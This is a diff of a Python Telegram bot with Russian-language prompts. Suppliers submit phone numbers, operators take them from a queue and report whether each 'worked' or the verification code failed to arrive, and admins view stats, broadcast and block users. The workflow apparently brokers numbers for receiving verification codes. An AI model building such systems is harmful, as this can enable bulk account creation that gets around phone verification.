+    tg_from = callback["from"]
+    telegram_id = tg_from["id"]
+    data = callback["data"]
+    user = create_or_touch_user(telegram_id, extract_username(tg_from))
+    if user["is_blocked"] or not user["password_check"]:
+        answer_callback(callback_id, "Сначала войдите по паролю.", True)
+        return
 
-    print("🤖 Бот успешно запущен!")
-    app.run_polling()
+    if data.startswith("menu:"):
+        handle_menu_callback(callback_id, chat_id, user, data)
+        return
+    if data.startswith("supplier:"):
+        handle_supplier_callback(callback_id, chat_id, user, data)
+        return
+    if data.startswith("operator:"):
+        handle_operator_callback(callback_id, chat_id, user, data)
+        return
+    if data.startswith("admin:"):
+        handle_admin_callback(callback_id, chat_id, user, data)
+        return
+    answer_callback(callback_id)
+
+
+def handle_menu_callback(callback_id, chat_id, user, data):
+    action = data.split(":", 1)[1]
+    if action == "home":
+        show_home(chat_id, user)
+    elif action == "profile":
+        show_profile(chat_id, user)
+    elif action == "add_number":
+        add_number_start(chat_id, user)
+    elif action == "my_numbers":
+        show_my_numbers(chat_id, user)
+    elif action == "my_queue":
+        show_my_queue(chat_id, user)
+    elif action == "take_number":
+        take_number(chat_id, user)
+    elif action == "admin":
+        if user["is_admin"]:
+            send_message(chat_id, "Админ-панель", admin_keyboard())
+        else:
+            send_message(chat_id, "Нет доступа.", main_menu_keyboard(user))
+    answer_callback(callback_id)
+
+
+def show_profile(chat_id, user):
+    with closing(db()) as conn:
+        added = conn.execute("SELECT COUNT(*) count FROM numbers WHERE supplier_user_id = ?", (user["id"],)).fetchone()["count"]
+        taken = conn.execute("SELECT COUNT(*) count FROM logs WHERE actor_user_id = ? AND event_type = 'number_taken'", (user["id"],)).fetchone()["count"]
+        done = conn.execute("SELECT COUNT(*) count FROM logs WHERE actor_user_id = ? AND event_type = 'number_done'", (user["id"],)).fetchone()["count"]
+        failed = conn.execute("SELECT COUNT(*) count FROM logs WHERE actor_user_id = ? AND event_type = 'number_failed'", (user["id"],)).fetchone()["count"]
+    lines = [
+        "👤 Профиль",
+        f"Username: {user_handle(user)}",
+        f"Роль: {role_title(user['role'])}",
+    ]
+    if user["role"] == ROLE_SUPPLIER:
+        lines.append(f"Добавлено номеров: {added}")
+    if user["role"] == ROLE_OPERATOR:
+        lines.extend([
+            f"Взято номеров: {taken}",
+            f"Встали: {done}",
+            f"Не встали: {failed}",
+        ])
+    text = "\n".join(lines)
+    send_message(chat_id, text, inline_keyboard([back_row()]))
+
+
+def add_number_start(chat_id, user):
+    if user["role"] != ROLE_SUPPLIER:
+        send_message(chat_id, "Добавлять номера может только поставщик.", main_menu_keyboard(user))
+        return
+    set_state(user["id"], "add_number")
+    send_message(chat_id, "➕ Отправьте российские номера списком, каждый с новой строки.\nПример:\n+79991234567\n89997654321")
+
+
+def show_my_numbers(chat_id, user):
+    if user["role"] != ROLE_SUPPLIER:
+        send_message(chat_id, "Раздел доступен поставщикам.", main_menu_keyboard(user))
+        return
+    with closing(db()) as conn:
+        rows = conn.execute(
+            "SELECT * FROM numbers WHERE supplier_user_id = ? ORDER BY id DESC LIMIT 10",
+            (user["id"],),
+        ).fetchall()
+    if not rows:
+        send_message(chat_id, "Пока номеров нет.", inline_keyboard([back_row()]))
+        return
+    send_message(chat_id, "📱 Последние ваши номера:", inline_keyboard([back_row()]))
+    for row in rows:
+        send_message(
+            chat_id,
+            f"#{row['id']} {row['masked_number']}\nСтатус: {row['status']}\nОсталось: {row['remaining']} из {row['volume']}\nПричина: {row['last_reason'] or '-'}",
+            supplier_number_keyboard(row["id"]),
+        )
+
+
+def show_my_queue(chat_id, user):
+    if user["role"] == ROLE_SUPPLIER:
+        with closing(db()) as conn:
+            rows = conn.execute(
+                """
+                SELECT n.*, op.username operator_username
+                FROM numbers n
+                LEFT JOIN users op ON op.id = n.assigned_operator_user_id
+                WHERE n.supplier_user_id = ? AND n.status IN (?, ?)
+                ORDER BY n.created_at ASC
+                LIMIT 15
+                """,
+                (user["id"], STATUS_AVAILABLE, STATUS_ASSIGNED),
+            ).fetchall()
+        if not rows:
+            send_message(chat_id, "В вашей очереди нет активных номеров.", inline_keyboard([back_row()]))
+            return
+        text = ["📦 Моя очередь:"]
+        for row in rows:
+            operator = f"@{row['operator_username']}" if row["operator_username"] else "-"
+            text.append(f"#{row['id']} {row['masked_number']} | {row['status']} | взял {operator}")
+        send_message(chat_id, "\n".join(text), inline_keyboard([back_row()]))
+        return
+
+    if user["role"] == ROLE_OPERATOR:
+        show_active_number(chat_id, user)
+        return
+
+    send_message(chat_id, "Очередь доступна поставщикам и операторам.", main_menu_keyboard(user))
+
+
+def take_number(chat_id, user):
+    if user["role"] != ROLE_OPERATOR:
+        send_message(chat_id, "Брать номера может только оператор.", main_menu_keyboard(user))
+        return
+    with closing(db()) as conn:
+        active = conn.execute(
+            """
+            SELECT * FROM numbers
+            WHERE assigned_operator_user_id = ? AND status = ?
+            ORDER BY assigned_at DESC LIMIT 1
+            """,
+            (user["id"], STATUS_ASSIGNED),
+        ).fetchone()
+        if active:
+            send_message(chat_id, "У вас уже есть активная заявка.", operator_active_keyboard(active["id"]))
+            return
+        row = conn.execute(
+            """
+            SELECT * FROM numbers
+            WHERE status = ? AND remaining > 0
+            ORDER BY created_at ASC LIMIT 1
+            """,
+            (STATUS_AVAILABLE,),
+        ).fetchone()
+        if not row:
+            send_message(chat_id, "Сейчас свободных номеров нет.", main_menu_keyboard(user))
+            return
+        conn.execute(
+            "UPDATE numbers SET status = ?, assigned_operator_user_id = ?, assigned_at = ? WHERE id = ?",
+            (STATUS_ASSIGNED, user["id"], now_iso(), row["id"]),
+        )
+        supplier = conn.execute("SELECT id, telegram_id FROM users WHERE id = ?", (row["supplier_user_id"],)).fetchone()
+        conn.commit()
+
+    log_event(user["id"], "number_taken", row["id"])
+    send_message(chat_id, f"📲 Заявка #{row['id']} взята.\nНомер: {row['masked_number']}\nОжидайте сообщение от поставщика.", operator_active_keyboard(row["id"]))
+    if supplier:
+        set_state(supplier["id"], "supplier_message", {"number_id": row["id"]})
+        send_message(
+            supplier["telegram_id"],
+            f"📩 Ваш номер #{row['id']} взяли.\nВведите сообщение для оператора. Не отправляйте одноразовые коды через бота.",
+            supplier_number_keyboard(row["id"]),
+        )
+
+
+def show_active_number(chat_id, user):
+    with closing(db()) as conn:
+        row = conn.execute(
+            """
+            SELECT * FROM numbers
+            WHERE assigned_operator_user_id = ? AND status = ?
+            ORDER BY assigned_at DESC LIMIT 1
+            """,
+            (user["id"], STATUS_ASSIGNED),
+        ).fetchone()
+    if not row:
+        send_message(chat_id, "Активной заявки нет.", main_menu_keyboard(user))
+        return
+    send_message(chat_id, f"📦 Активная заявка #{row['id']}\nНомер: {row['masked_number']}\nСтатус: {row['status']}", operator_active_keyboard(row["id"]))
+
+
+def handle_supplier_callback(callback_id, chat_id, user, data):
+    if user["role"] != ROLE_SUPPLIER:
+        answer_callback(callback_id, "Нет доступа.", True)
+        return
+    _, action, raw_id = data.split(":")
+    number_id = int(raw_id)
+    with closing(db()) as conn:
+        row = conn.execute("SELECT * FROM numbers WHERE id = ?", (number_id,)).fetchone()
+        if not row or row["supplier_user_id"] != user["id"]:
+            answer_callback(callback_id, "Нет доступа к заявке.", True)
+            return
+        if action == "repeat":
+            set_state(user["id"], "supplier_repeat_reason", {"number_id": number_id})
+            send_message(chat_id, "🔁 Укажите причину повтора.")
+        elif action == "cancel":
+            set_state(user["id"], "cancel_reason", {"number_id": number_id})
+            send_message(chat_id, "Укажите причину отмены.")
+    answer_callback(callback_id)
+
+
+def handle_operator_callback(callback_id, chat_id, user, data):
+    if user["role"] != ROLE_OPERATOR:
+        answer_callback(callback_id, "Нет доступа.", True)
+        return
+    _, action, raw_id = data.split(":")
+    number_id = int(raw_id)
+    with closing(db()) as conn:
+        row = conn.execute("SELECT * FROM numbers WHERE id = ?", (number_id,)).fetchone()
+        if not row or row["assigned_operator_user_id"] != user["id"]:
+            answer_callback(callback_id, "Нет доступа к заявке.", True)
+            return
+        supplier = conn.execute("SELECT id, telegram_id FROM users WHERE id = ?", (row["supplier_user_id"],)).fetchone()
+        if action == "done":
+            conn.execute(
+                """
+                UPDATE numbers
+                SET status = ?, remaining = 0, completed_at = ?
+                WHERE id = ?
+                """,
+                (STATUS_DONE, now_iso(), number_id),
+            )
+            conn.commit()
+            log_event(user["id"], "number_done", number_id)
+            send_message(chat_id, f"✅ Заявка #{number_id}: успех сохранен.", main_menu_keyboard(user))
+            if supplier:
+                send_message(supplier["telegram_id"], f"✅ По заявке #{number_id}: успех.")
+        elif action == "repeat_message":
+            conn.commit()
+            log_event(user["id"], "repeat_message_requested", number_id)
+            send_message(chat_id, f"🔁 По заявке #{number_id} запрошен повтор сообщения.", operator_active_keyboard(number_id))
+            if supplier:
+                set_state(supplier["id"], "supplier_message", {"number_id": number_id})
+                send_message(
+                    supplier["telegram_id"],
+                    f"🔁 Оператор запросил повтор сообщения по заявке #{number_id}.\nВведите новое сообщение. Не отправляйте одноразовые коды через бота.",
+                    supplier_number_keyboard(number_id),
+                )
+        elif action == "repeat":
+            set_state(user["id"], "operator_repeat_reason", {"number_id": number_id})
+            send_message(chat_id, "🔁 Укажите причину повтора: неверный формат, не пришел код или другая причина.")
+        elif action == "skip":
+            conn.execute(
+                "UPDATE numbers SET status = ?, assigned_operator_user_id = NULL, assigned_at = NULL WHERE id = ?",
+                (STATUS_AVAILABLE, number_id),
+            )
+            conn.commit()
+            log_event(user["id"], "number_skipped", number_id)
+            send_message(chat_id, f"⏭️ Заявка #{number_id} возвращена в очередь.", main_menu_keyboard(user))
+        elif action == "failed":
+            set_state(user["id"], "fail_reason", {"number_id": number_id})
+            send_message(chat_id, "Укажите причину, почему не встал.")
+    answer_callback(callback_id)
+
+
+def handle_admin_callback(callback_id, chat_id, user, data):
+    if not user["is_admin"]:
+        answer_callback(callback_id, "Нет доступа.", True)
+        return
+    action = data.split(":")[1]
+    if action == "stats":
+        send_message(chat_id, build_global_stats(), admin_keyboard())
+    elif action == "operator_stats":
+        send_message(chat_id, build_operator_stats(), admin_keyboard())
+    elif action == "auto_report":
+        send_message(chat_id, build_auto_report(), admin_keyboard())
+    elif action == "grant_operator":
+        set_state(user["id"], "grant_operator")
+        send_message(chat_id, "🎧 Введите @username пользователя, которому выдать роль оператора.")
+    elif action == "reset_queue":
+        with closing(db()) as conn:
+            conn.execute(
+                """
+                UPDATE numbers
+                SET status = ?, assigned_operator_user_id = NULL, assigned_at = NULL
+                WHERE status = ?
+                """,
+                (STATUS_AVAILABLE, STATUS_ASSIGNED),
+            )
+            conn.commit()
+        log_event(user["id"], "queue_reset")
+        send_message(chat_id, "♻️ Очередь сброшена: активные заявки возвращены в доступные.", admin_keyboard())
+    elif action == "broadcast":
+        set_state(user["id"], "broadcast")
+        send_message(chat_id, "📣 Введите текст рассылки.")
+    elif action == "block":
+        set_state(user["id"], "block_user")
+        send_message(chat_id, "Введите @username пользователя для блокировки.")
+    elif action == "unblock":
+        set_state(user["id"], "unblock_user")
+        send_message(chat_id, "✅ Введите @username пользователя для разблокировки.")
+    answer_callback(callback_id)
+
+
+def send_auto_reports_if_needed(state):
+    if get_setting("auto_reports_enabled", "1") != "1":
+        return
+    now = time.time()
+    if now - state["last_auto_report_at"] < AUTO_REPORT_INTERVAL_SECONDS:
+        return
+    state["last_auto_report_at"] = now
+    report = "⏱️ Автоотчет\n\n" + build_auto_report()
+    with closing(db()) as conn:
+        admins = conn.execute("SELECT telegram_id FROM users WHERE is_admin = 1 AND is_blocked = 0").fetchall()
+    for admin in admins:
+        try:
+            send_message(admin["telegram_id"], report, admin_keyboard())
+        except Exception:
+            pass
+
+
+def poll():
+    init_db()
+    offset = 0
+    runtime_state = {"last_auto_report_at": time.time()}
+    print("Bot started.")
+    while True:
+        try:
+            updates = api("getUpdates", {"offset": offset, "timeout": 50})
+            for update in updates:
+                offset = update["update_id"] + 1
+                if "message" in update and "text" in update["message"]:
+                    handle_text(update["message"])
+                elif "callback_query" in update:
+                    handle_callback(update["callback_query"])
+            send_auto_reports_if_needed(runtime_state)
+        except KeyboardInterrupt:
+            print("Bot stopped.")
+            break
+        except Exception as exc:
+            print(f"Error: {exc}")
+            time.sleep(3)
+
 
 if __name__ == "__main__":
-    main()
+    poll()
